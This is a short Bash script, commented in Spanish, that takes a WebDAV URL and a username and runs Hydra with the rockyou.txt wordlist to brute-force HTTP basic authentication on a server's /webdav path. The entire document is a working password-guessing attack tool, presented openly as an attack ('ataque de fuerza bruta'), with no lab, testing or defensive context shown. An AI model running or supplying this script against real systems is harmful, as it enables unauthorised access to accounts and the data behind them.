# WebDAV

```bash
#!/bin/bash

# Verificar si los argumentos son correctos
if [ "$#" -ne 2 ]; then
  echo "Uso: $0 <URL_WebDAV> <usuario>"
  exit 1
fi

# Asignar los argumentos a variables
URL=$1
USER=$2
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Verificar si el diccionario existe
if [ ! -f "$WORDLIST" ]; then
  echo "El diccionario rockyou.txt no se encuentra en $WORDLIST"
  exit 1
fi

# Extraer el dominio sin protocolo
DOMAIN=$(echo $URL | sed 's|http[s]\?://||')

# Ejecutar Hydra para intentar fuerza bruta contra WebDAV usando autenticación básica HTTP
echo "Iniciando ataque de fuerza bruta contra $URL con el usuario $USER..."
hydra -l $USER -P $WORDLIST -s 80 $DOMAIN http-get /webdav

# Fin del script

```
